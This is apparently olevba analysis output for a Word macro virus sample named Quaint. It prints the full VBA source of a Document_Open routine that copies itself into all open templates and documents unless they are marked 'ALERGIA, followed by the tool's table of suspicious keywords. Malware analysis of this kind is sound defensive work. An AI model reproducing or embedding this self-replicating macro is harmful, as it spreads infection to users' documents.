olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Quaint-cb515fef9ad7f54c84b1726446346fd54d1217a9
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Quaint-cb515fef9ad7f54c84b1726446346fd54d1217a9 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Document_Open()
Const JEDAN = 2 - 1
ASD987 = Templates.Count
ASD654 = Strings.LTrim(ThisDocument.VBProject.VBCOMPONENTS(JEDAN) _
.CODEMODULE.LINES(JEDAN, ThisDocument.VBProject.VBCOMPONENTS(JEDAN) _
.CODEMODULE.COUNTOFLINES))
For a = 1 To ASD987
   With Templates(a).VBProject.VBCOMPONENTS(JEDAN).CODEMODULE
        If .LINES(JEDAN, 27) <> "'ALERGIA" Then
             .DELETELINES JEDAN, .COUNTOFLINES: .ADDFROMSTRING ASD654
        End If
   End With
Next a
For b = 1 To Documents.Count
    With Documents(b).VBProject.VBCOMPONENTS(JEDAN).CODEMODULE
        If .LINES(JEDAN, 27) <> "'ALERGIA" Then
             .DELETELINES JEDAN, .COUNTOFLINES: .ADDFROMSTRING ASD654
        End If
    End With
Next b
End Sub
'ALERGIA

























+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBCOMPONENTS        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CODEMODULE          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|ADDFROMSTRING       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

